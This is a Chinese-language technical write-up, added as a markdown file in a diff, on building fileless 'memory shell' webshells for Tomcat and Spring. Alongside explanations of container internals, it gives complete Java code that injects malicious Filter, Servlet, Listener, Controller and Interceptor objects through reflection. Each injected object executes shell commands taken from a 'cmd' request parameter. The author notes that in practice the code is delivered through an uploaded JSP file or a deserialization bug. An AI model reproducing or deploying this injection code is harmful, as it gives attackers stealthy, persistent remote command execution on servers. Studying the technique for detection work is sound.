@@ -1,0 +1,574 @@
+- [MemoryShell](#memoryshell)
+  - [基于Servlet 3.0 API](#基于servlet-30-api)
+    - [Filter](#filter)
+      - [FilterChain](#filterchain)
+        - [FilterMaps](#filtermaps)
+        - [FilterConfig](#filterconfig)
+        - [注入思路](#注入思路)
+      - [实现代码](#实现代码)
+    - [Serverlet](#serverlet)
+      - [Context#Servlet初始化](#contextservlet初始化)
+      - [实现思路](#实现思路)
+        - [wapper](#wapper)
+        - [ServletMapping](#servletmapping)
+      - [实现代码](#实现代码-1)
+    - [Listener](#listener)
+      - [applicationEventListenersList](#applicationeventlistenerslist)
+      - [实现思路](#实现思路-1)
+      - [实现代码](#实现代码-2)
+  - [基于框架](#基于框架)
+    - [Spring框架](#spring框架)
+      - [Controller](#controller)
+        - [Controller的注册流程](#controller的注册流程)
+        - [注入思路](#注入思路-1)
+        - [实现思路](#实现思路-2)
+      - [Interceptor](#interceptor)
+        - [注入思路](#注入思路-2)
+        - [实现代码](#实现代码-3)
+  - [参考](#参考)
+
+# MemoryShell
+内存马的实现思路主要是通过Servlet API(或者web框架类似的功能)提供的动态修改特性(不同容器对该接口实现不同)向运行中的Web容器实时植入相关运行代码,而这种方式添加的代码会直接被加入到内存中被执行而不会在硬盘上以文件的方式存在,即无文件落地执行,从而称为内存马,这导致内存马比常规的Webshell更难被发现和查杀,隐蔽性更高,缺点則是因为是放在在内存中执行,正常情况下如果Web容器重启则相关植入的代码则会被清除.  
+## 基于Servlet 3.0 API
+从Servlet 3.0 API开始允许用户在代码中动态注册Servlet,Filter,Listener,而Servlet,Listener,Filter都是由`javax.servlet.ServletContext`去加载.
+![](2023-01-28-16-01-39.png)  
+可以看到该`ServletContext`接口中分别提供了相关的`add`和`create`方法,然后不同Web容器对该方法进行实现即可,后续测试以tomcat 8.5.64为例.  
+
+而一般注入内存马有两种方式  
+* 先通过漏洞上传jsp文件,通过该jsp文件执行相关java代码向内存中植入内存马,再将jsp文件删除即可.  
+这种方式还是需要先通过文件落地的方式做载体,用于将文件webshell转为内存Webshell.  
+* 通过可以直接执行java代码的漏洞植入内存马(反序列化漏洞等).   
+这种方式才是纯粹的无文件落地内存马,但对漏洞利用环境要求严格.
+### Filter
+Filter即过滤器,过滤器类在Web容器中往往是最先执行的Servlet,常用于执行权限校验等和业务逻辑无关的操作,而Filter内存马即通过相关的动态API向Web容器中注册一个恶意的Filter类,并将其放到整个Filter执行链的最前面,这样每次请求Web容器都会执行我们恶意Filter类中的代码.  
+#### FilterChain 
+Filter的执行都是以链的形式依次执行的,而想要将恶意的Filter加入到该链中首先要知道这个FilterChain是怎么得到的.
+而在tomcat中,对于每个请求,FilterChain都是动态生成的,具体实现代码在`ApplicationFilterFactory#createFilterChain`中.
+![](2023-01-28-16-45-42.png)  
+从该类的实现中可以看到每次请求的`FilterChain`生成流程如下:
+1. 首先从`(StandardContext)Context`中获取到`FilterMaps`.
+2. 根据该请求的url依次与`FilterMaps`中的各Filter的url进行匹配,如果匹配则根据匹配Filter的name在`(ApplicationFilterConfig)Context`中获取到对应的`ApplicationFilterConfig`对象,并将其`ApplicationFilterConfig`对象加入到filterChain中.
+3. 后续通过依次执行`filterChain`中`ApplicationFilterConfig`对象的`getFilter()`方法得到对应的Filter实例来执行其`DoFilter`方法.  
+
+根据该流程,那么需要满足两个条件.  
+1. 首先要在`(StandardContext)Context`的`FilterMaps`中添加FilterMap.  
+2. 在`(ApplicationFilterConfig)Context`添加对应的`filterConfig`.  
+##### FilterMaps
+而FilterMaps的生成是在`ApplicationFilterRegistration#addMappingForUrlPatterns`方法中.
+![](2023-01-28-17-06-03.png)  
+![](2023-01-28-17-08-23.png)  
+可以看到Filter的name是从一个`FilterDef`对象获得的,然后设置该FilterMap的url匹配规则和name,然后调用`StandardContext#addFilterMap`将其加入到`FilterMaps中`.
+##### FilterConfig
+FilterConfig的生成則是在`StandardContext#filterStart`中.  
+![](2023-01-28-17-11-36.png)  
+可以看到其从`filterDefs`中循环取出`FilterDef`对象生成`ApplicationFilterConfig`放入`filterConfigs`中.
+##### 注入思路
+根据以上的原理,我们首先可以先调用`ApplicationFilterRegistration#addMappingForUrlPatterns`来添加FilterMap,其中`FilterDef`对象是由`ApplicationFilterRegistration`的构造函数中赋值,寻找创建`ApplicationFilterRegistration`对象的地方可以发现正是在tomcat实现Servlet 3.0 API `addFilter`接口的地方`ApplicationContext#addFilter`返回了`ApplicationFilterRegistration`对象.  
+![](2023-01-28-17-19-57.png)  
+可以根据Filter类路径和Filter类实例来生成对应的`FilterDef`,我们只能通过传入恶意Filter实例类,然后再调用`addMappingForUrlPatterns`方法即可添加 `FilterMap`了.  
+但在前面还有一个应用生命周期的判断,这里需要使用反射进行修改绕过,添加后再修改回来.  
+```java
+        if (!context.getState().equals(LifecycleState.STARTING_PREP)) {
+            //TODO Spec breaking enhancement to ignore this restriction
+            throw new IllegalStateException(
+                    sm.getString("applicationContext.addFilter.ise",
+                            getContextPath()));
+        }
+```
+然后调用`StandardContext#filterStart`生成`ApplicationFilterConfig`,而向其中的`filterDefs`变量添加对应的`FilterDef`則是直接调用`addFilterDef`即可.
+![](2023-01-28-17-34-56.png)
+#### 实现代码
+上述的实现思路知道原理后其实很多地方可以直接使用反射来修改`filterConfigs`和`FilterMaps`变量,而不用再分别去调用相关方法添加相关对象,更加简洁.  
+几个关键点:
+1. 使用反射添加的话就不必考虑`addMappingForUrlPatterns`中对运行状态的判断了
+2. 添加FilterMap的时候,由于FilterMaps对象是一个ContextFilterMaps类,而该类是StandardContext对象的私有内部类,通过反射无法显式得到该属性的类型,无法直接强制转换,可以通过反射得到其相关add方法来添加FilterMap.
+3. ContextFilterMaps类有两个addFilter方法,使用`addBefore`則是将该Filter添加在常规Mapping映射的Filter前面,一般来说就是在用户自定义filter的前面了,而不必再对filterMaps属性手动调换位置. 
+```java
+package org.example.Servlets;
+
+import org.apache.catalina.core.ApplicationFilterConfig;
+import org.apache.catalina.core.StandardContext;
+import org.apache.tomcat.util.descriptor.web.FilterDef;
+import org.apache.tomcat.util.descriptor.web.FilterMap;
+
+import javax.servlet.*;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.IOException;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.util.HashMap;
+
+public class ShellFilter extends HttpServlet {
+    @Override
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
+        ServletContext servletContext = req.getServletContext();
+        StandardContext o = null;
+        //如果已有则避免重复添加
+        if (servletContext.getFilterRegistration("shellFilter") != null) {
+            return;
+        }
+        while (o ==null) {
+            try {
+                Field f = servletContext.getClass().getDeclaredField("context");
+                f.setAccessible(true);
+                Object ob = f.get(servletContext);
+                if (ob instanceof ServletContext) {
+                    servletContext = (ServletContext) ob;
+                } else if (ob instanceof StandardContext) {
+                    o = (StandardContext) ob;
+                }
+            } catch (NoSuchFieldException | IllegalAccessException e) {
+                throw new RuntimeException(e);
+            }
+        }
+        //生成FilterDef
+        FilterDef filterDef = new FilterDef();
+        filterDef.setFilterName("shellFilter");
+        filterDef.setFilter(getFilter());
+        filterDef.setFilterClass(getFilter().getClass().getName());
+        //生成ApplicationFilterConfig,并添加到filterConfigs
+        Constructor<?>[] constructor = ApplicationFilterConfig.class.getDeclaredConstructors();
+        constructor[0].setAccessible(true);
+        try {
+            ApplicationFilterConfig config = (ApplicationFilterConfig) constructor[0].newInstance(o, filterDef);
+            Field filterConfigsField;
+            try {
+                filterConfigsField = o.getClass().getDeclaredField("filterConfigs");
+                filterConfigsField.setAccessible(true);
+                HashMap<String, ApplicationFilterConfig> filterConfigs = (HashMap<String, ApplicationFilterConfig>) filterConfigsField.get(o);
+                filterConfigs.put("shellFilter", config);
+                //生成FilterMap,并添加到FilterMaps
+                FilterMap filterMap = new FilterMap();
+                filterMap.setFilterName("shellFilter");
+                filterMap.addURLPattern("*");
+                filterMap.setDispatcher(DispatcherType.REQUEST.name());
+                //得到FilterMaps对象
+                Field filterMapField = o.getClass().getDeclaredField("filterMaps");
+                filterMapField.setAccessible(true);
+                Object object = filterMapField.get(o);
+                //FilterMaps对象是一个ContextFilterMaps类,而该类是StandardContext的私有内部类,无法直接强制转换,通过反射得到其add方法来添加FilterMap.
+                Class<?> cl = Class.forName("org.apache.catalina.core.StandardContext$ContextFilterMaps");
+                Method m = cl.getDeclaredMethod("addBefore", FilterMap.class);
+                m.setAccessible(true);
+                m.invoke(object, filterMap);
+            } catch (NoSuchFieldException | ClassNotFoundException | NoSuchMethodException e) {
+                throw new RuntimeException(e);
+            }
+
+        } catch (InstantiationException | IllegalAccessException | InvocationTargetException e) {
+            throw new RuntimeException(e);
+        }
+        resp.getWriter().println("inject done");
+
+    }
+    public Filter getFilter(){
+        return new Filter() {
+            @Override
+            public void init(FilterConfig filterConfig) {
+
+            }
+
+            @Override
+            public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException {
+                if (request.getParameter("cmd") != null) {
+                    Runtime.getRuntime().exec(request.getParameter("cmd"));
+                    response.getWriter().println("exec cmd with "+request.getParameter("cmd"));
+                }else {
+                    response.getWriter().println("shellFilter inject");
+                }
+            }
+
+            @Override
+            public void destroy() {
+
+            }
+        };
+    }
+}
+
+```
+先访问该路由注入内存马后,访问任意URL,只要带上cmd参数即可.
+![](2023-01-29-15-09-26.png)  
+![](2023-01-29-15-09-51.png)  
+实际场景中,将相关代码用JSP文件做载体访问执行即可.
+### Serverlet
+Serverlet即Web容器中一个个运行的逻辑模块,Serverlet内存马即通过动态API注入含有恶意代码的Serverlet到内存中,实现访问特定的url触发相关代码执行,同样的首先理清楚在web容器中Serverlet的生成流程,而在tomcat中动态添加Serverlet的方法是在tomcat7中才有的.
+#### Context#Servlet初始化
+在tomcat启动的过程中,在`org/apache/catalina/startup/ContextConfig#webConfig()`方法中配置应用的整个环境context,其中在第9步开始读取web.xml文件来解析其中的内容添加到context中,而Servlet的定义正是在其中.  
+![](2023-01-29-15-52-19.png)  
+而在`configureContext`中其配置servlet的步骤如下.  
+![](2023-01-29-16-14-00.png)  
+解析web.xml后,其中的servlet定义全部被转换为了`ServletDef`对象,然后依次对每个`ServletDef`进行处理,可以看到其创建了一个wrapper来包装每一个servlet.  
+![](2023-01-29-16-16-47.png)  
+在最后再将该wapper和对应的`ServletMapping`添加到了context中.  
+所以想要添加servlet的话那么就需要向context中加入包装servlet的wapper和对应的mapping映射即可.
+#### 实现思路
+##### wapper
+添加wapper的思路很简单,与初始化流程类似,创建一个wapper,设置相关属性为要注入的servlet即可,然后调用`standardContext.addChild(wrapper)`即可.
+##### ServletMapping
+同样的调用`standardContext.addServletMappingDecoded()`方法添加即可.
+#### 实现代码
+```java
+package org.example.Servlets;
+
+import org.apache.catalina.Wrapper;
+import org.apache.catalina.core.StandardContext;
+
+import javax.servlet.*;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.IOException;
+import java.lang.reflect.Field;
+
+public class ShellServlet extends HttpServlet {
+
+    @Override
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
+        ServletContext servletContext = req.getServletContext();
+        StandardContext standardContext = null;
+        //如果已有则避免重复添加
+        if (servletContext.getServletRegistration("shellServlet") != null) {
+            resp.getWriter().println("injected");
+            return;
+        }
+        while (standardContext ==null) {
+            try {
+                Field f = servletContext.getClass().getDeclaredField("context");
+                f.setAccessible(true);
+                Object ob = f.get(servletContext);
+                if (ob instanceof ServletContext) {
+                    servletContext = (ServletContext) ob;
+                } else if (ob instanceof StandardContext) {
+                    standardContext = (StandardContext) ob;
+                }
+            } catch (NoSuchFieldException | IllegalAccessException e) {
+                throw new RuntimeException(e);
+            }
+        }
+        Servlet httpServlet = getServlet();
+        //创建wrapper添加到standardContext
+        Wrapper wrapper = standardContext.createWrapper();
+        wrapper.setName("shellServlet");
+        wrapper.setLoadOnStartup(1);
+        wrapper.setServlet(httpServlet);
+        wrapper.setServletClass(httpServlet.getClass().getName());
+        standardContext.addChild(wrapper);
+        //添加URL映射
+        standardContext.addServletMappingDecoded("/servletShell","shellServlet");
+        resp.getWriter().println("inject done");
+        }
+
+public Servlet getServlet(){
+        return  new Servlet() {
+            @Override
+            public void init(ServletConfig config) throws ServletException {
+
+            }
+
+            @Override
+            public ServletConfig getServletConfig() {
+                return null;
+            }
+
+            @Override
+            public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
+                if (req.getParameter("cmd") != null) {
+                    Runtime.getRuntime().exec(req.getParameter("cmd"));
+                    res.getWriter().println("exec cmd with "+req.getParameter("cmd"));
+                }else {
+                    res.getWriter().println("shellServlet inject");
+                }
+            }
+
+            @Override
+            public String getServletInfo() {
+                return null;
+            }
+
+            @Override
+            public void destroy() {
+
+            }
+        };
+}
+}
+
+```
+![](2023-01-29-16-43-50.png)  
+先访问该路由注入内存马后,访问映射的Url即可.  
+![](2023-01-29-17-03-19.png)  
+### Listener
+Listener即监听器,在web容器中可以监听一些事件发生并执行相关的逻辑操作,同样该特性也可以用来注入内存马,使得在特定条件下执行我们的恶意代码.
+#### applicationEventListenersList
+在tomcat中,其实现的`addListener()`方法如下.  
+![](2023-01-29-17-47-13.png)  
+![](2023-01-29-17-47-39.png)  
+可以看到其将Listener加入到了context的`applicationEventListenersList`属性中,也就是说`applicationEventListenersList`即储存了web容器的listener,而且可以看到Listener是`EventListener`的子类.
+#### 实现思路
+实现思路则很简单,直接利用反射获取到`applicationEventListenersList`属性再添加恶意的listener即可.  
+而不同的Listener在不同的条件下触发,而作为内存马的Listener需要具有通用性,保证能稳定触发.  
+通常在内存马中使用`ServletRequestListener`进行注入.  
+![](2023-01-29-18-15-20.png)  
+其定义了两个方法,分别在一个请求创建和销毁时触发,并且可以从其传入的`ServletRequestEvent`对象获取到`ServletRequest`.  
+#### 实现代码
+```java
+package org.example.Servlets;
+
+import org.apache.catalina.core.StandardContext;
+
+import javax.servlet.ServletContext;
+import javax.servlet.ServletRequestEvent;
+import javax.servlet.ServletRequestListener;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.IOException;
+import java.lang.reflect.Field;
+import java.util.EventListener;
+
+public class ShellListener extends HttpServlet {
+    @Override
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
+        ServletContext servletContext = req.getServletContext();
+        StandardContext standardContext = null;
+        while (standardContext ==null) {
+            try {
+                Field f = servletContext.getClass().getDeclaredField("context");
+                f.setAccessible(true);
+                Object ob = f.get(servletContext);
+                if (ob instanceof ServletContext) {
+                    servletContext = (ServletContext) ob;
+                } else if (ob instanceof StandardContext) {
+                    standardContext = (StandardContext) ob;
+                }
+            } catch (NoSuchFieldException | IllegalAccessException e) {
+                throw new RuntimeException(e);
+            }
+        }
+        standardContext.addApplicationEventListener(getListener());
+    }
+    
+    public EventListener getListener() {
+            return new ServletRequestListener() {
+                @Override
+                public void requestDestroyed(ServletRequestEvent sre) {
+                }
+                @Override
+                public void requestInitialized(ServletRequestEvent sre) {
+                    if(sre.getServletRequest().getParameter("cmd")!=null) {
+                        try {
+                            Runtime.getRuntime().exec(sre.getServletRequest().getParameter("cmd"));
+                        } catch (IOException e) {
+                            throw new RuntimeException(e);
+                        }
+                    }
+                }
+            };
+    }
+}
+
+```
+访问路由后,在之后的请求中带上cmd参数即可.
+## 基于框架
+跳开Servlet API的局限,同样只要是提供了类似的方法和模式的框架都可以进行内存马的注入.
+### Spring框架
+以Spring框架为例,其Controller有点类似于Servlet,其路由模式都依赖于URL的路径映射,而在Spring中同样有动态添加Controller的方法,而在Spring中注入内存马的方法在大部分场景下都是通过反序列化等直接执行java代码了,因为Spring生态对jsp支持并不好.
+#### Controller
+在Spring中Controller注解配置了方法与URL的路径关系,而解析Controller注解的流程始于SpringMVC初始化时对每个Bean进行初始化时会对含有Controller注解的bean调用`RequestMappingHandlerMapping`类进行处理.
+##### Controller的注册流程  
+SpringMVC在启动时,对Bean的初始化流程大致如下.  
+![](2023-01-30-15-54-28.png)  
+在设置完相关属性后,如果该会调用`afterPropertiesSet`来设置该bean的其它配置,其中如果该Bean含有Controller或者RequestMapping注解的话则会调用`initHandlerMethods`来配置各个方法.  
+ ![](2023-01-30-15-56-06.png) 
+ ![](2023-01-30-16-10-36.png)  
+ 在`isHandler`中判断是否含有相关注解.
+ ![](2023-01-30-16-10-58.png)
+ 然后使用`detectHandlerMethods`来配置每一个Hanlder的方法,其中依次调用`getMappingForMethod`方法来得到每个方法的`RequestMapping`注解,然后将含有`RequestMapping`注解和对应的method的方法存入一个map中.  
+![](2023-01-30-16-03-47.png)  
+在最后可以看到对map中的方法调用`registerHandlerMethod`方法.  
+最后在`org/springframework/web/servlet/handler/AbstractHandlerMethodMapping.java`中将路径,方法等信息注册到registry中,这样就完成对应路径和方法映射的注册.
+![](2023-01-30-16-07-03.png)
+##### 注入思路
+知道了正常情况Controller的注册流程后则注入内存马的就很简单了,反射得到RequestMappingHandlerMapping,并调用其`registerMapping`方法注入即可.
+##### 实现思路  
+Spring 2.5 开始到 Spring 3.1 之前一般使用`org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping`映射器 ；
+
+Spring 3.1 开始及以后一般开始使用新的`org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping`映射器来支持@Contoller和@RequestMapping注解。  
+所以根据不同版本注入的方式有一定区别.  
+1. 在Spring 4.0之后可以直接使用registerMapping注册,最为简单,且该方法不需要强制使用 @RequestMapping 注解定义 URL 地址和 HTTP 方法.
+```java
+package springweb.controller;
+
+import com.alibaba.fastjson.JSON;
+import org.springframework.web.bind.annotation.*;
+import org.springframework.web.context.WebApplicationContext;
+import org.springframework.web.context.request.RequestContextHolder;
+import org.springframework.web.context.request.ServletRequestAttributes;
+import org.springframework.web.servlet.ModelAndView;
+import org.springframework.web.servlet.mvc.Controller;
+import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
+import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
+import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
+import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
+import org.springframework.web.servlet.support.RequestContextUtils;
+import springweb.beans.evilController;
+
+import java.lang.reflect.Method;
+
+@RestController
+public class MemoryShellController {
+    @RequestMapping("/controllerInject")
+    public String controllerInject() {
+        WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());
+        RequestMappingHandlerMapping mapping = context.getBean(RequestMappingHandlerMapping.class);
+        Controller controller = evilController.getController();
+        Method method = controller.getClass().getDeclaredMethods()[0];
+        PatternsRequestCondition url = new PatternsRequestCondition("/springShell");
+        RequestMethodsRequestCondition mc = new RequestMethodsRequestCondition();
+        RequestMappingInfo info = new RequestMappingInfo(url, mc, null, null, null, null, null);
+        mapping.registerMapping(info, controller, method);
+        return "";
+    }
+
+}
+
+```
+```java
+package springweb.beans;
+
+import org.springframework.web.servlet.ModelAndView;
+import org.springframework.web.servlet.mvc.Controller;
+
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.PrintWriter;
+import java.util.Scanner;
+
+public class evilController {
+    public static Controller getController(){
+        return new Controller() {
+            @Override
+            public ModelAndView handleRequest(HttpServletRequest request, HttpServletResponse response) throws Exception {
+                String cmd = request.getParameter("cmd");
+                PrintWriter writer = response.getWriter();
+                if (cmd != null) {
+                    String o = "";
+                    ProcessBuilder p;
+                    if (System.getProperty("os.name").toLowerCase().contains("win")) {
+                        p = new ProcessBuilder("cmd.exe", "/c", cmd);
+                    } else {
+                        p = new ProcessBuilder("/bin/sh", "-c", cmd);
+                    }
+                    Scanner c = new Scanner(p.start().getInputStream()).useDelimiter("\\A");
+                    o = c.hasNext() ? c.next() : o;
+                    c.close();
+                    writer.write(o);
+                    writer.flush();
+                    writer.close();
+                } else {
+                    response.sendError(404);
+                }
+                return null;
+            }
+        };
+    }
+}
+
+
+```  
+使用如果使用SpringBoot 2.6.0或更高版本会有lookupPath错误.
+2. 针对以前的映射器可以通过以下思路,注意该方式需要在`evilController`使用RequestMapping指定对应方法的路径.  
+```java
+// 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean
+context.getBeanFactory().registerSingleton("dynamicController", new evilController());
+// 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean
+org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping  dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class);
+// 3. 反射获得 registerHandler Method
+java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod("registerHandler", String.class, Object.class);
+m1.setAccessible(true);
+// 4. 将 dynamicController 和 URL 注册到 handlerMap 中
+m1.invoke(dh, "/shellpath", "dynamicController");
+```
+3. 针对新的映射器也可以调用`detectHandlerMethods`来注册,该方式也需要在`evilController`使用RequestMapping指定对应方法的路径.
+```java
+context.getBeanFactory().registerSingleton("dynamicController", new evilController());
+org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);
+java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod("detectHandlerMethods", Object.class);
+m1.setAccessible(true);
+m1.invoke(requestMappingHandlerMapping, "dynamicController");
+```  
+原理都是知道正常controller注册的流程后,直接反射调用正常流程中某一个步骤构造对应参数调用即可.  
+![](2023-01-30-17-58-18.png)
+#### Interceptor 
+Interceptor即Spring中的拦截器,类似于Servlet中的Filter,而Interceptor针对Controller进行拦截,在指定的Controller执行之前会先调用Interceptor.
+在HandlerInterceptor接口中,其提供了如下几个接口.  
+![](2023-01-30-17-35-53.png)  
+可以看到通过这几个方法可以获得请求对象来执行相关代码,同样的则可以注入拦截器内存马,执行恶意代码.  
+当SpringMvc在处理每一个Handler时,通过 HandlerMapping 的 getHandler 方法获取到对应的Hanlder,而就是在其中会通过`getHandlerExecutionChain`来得到该Hanlder执行前的拦截器列表,而拦截器列表可以看到是储存在`adaptedInterceptors`变量中的.  
+![](2023-01-30-17-40-15.png)  
+##### 注入思路
+只需要将恶意的Interceptor直接添加进`adaptedInterceptors`变量即可.
+##### 实现代码
+```java
+    public  void interceptorInject() throws NoSuchFieldException, IllegalAccessException {
+        WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());
+        RequestMappingHandlerMapping mapping = context.getBean(RequestMappingHandlerMapping.class);
+        java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
+        field.setAccessible(true);
+        java.util.ArrayList<Object> adaptedInterceptors = (ArrayList<Object>) field.get(mapping);
+        adaptedInterceptors.add(evilInterceptor.getInterceptor());
+    }
+```
+```java
+package springweb.beans;
+
+import org.springframework.web.servlet.HandlerInterceptor;
+
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.PrintWriter;
+import java.util.Scanner;
+
+public class evilInterceptor {
+    public static HandlerInterceptor getInterceptor(){
+        return new HandlerInterceptor() {
+            @Override
+            public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
+                String cmd = request.getParameter("cmd");
+                PrintWriter writer = response.getWriter();
+                if (cmd != null) {
+                    String o = "";
+                    ProcessBuilder p;
+                    if (System.getProperty("os.name").toLowerCase().contains("win")) {
+                        p = new ProcessBuilder("cmd.exe", "/c", cmd);
+                    } else {
+                        p = new ProcessBuilder("/bin/sh", "-c", cmd);
+                    }
+                    Scanner c = new Scanner(p.start().getInputStream()).useDelimiter("\\A");
+                    o = c.hasNext() ? c.next() : o;
+                    c.close();
+                    writer.write(o);
+                    writer.flush();
+                    writer.close();
+                } else {
+                    response.sendError(404);
+                }
+                return true;
+            }
+        };
+    }
+}
+
+```
+![](2023-01-30-17-56-44.png)
+## 参考
+https://su18.org/post/memory-shell/  
+https://su18.org/post/memory-shell-2/  
+https://mp.weixin.qq.com/s/NKq4BZ8fLK7bsGSK5UhoGQ  
+https://xz.aliyun.com/t/7388  
+https://www.anquanke.com/post/id/198886#h2-14
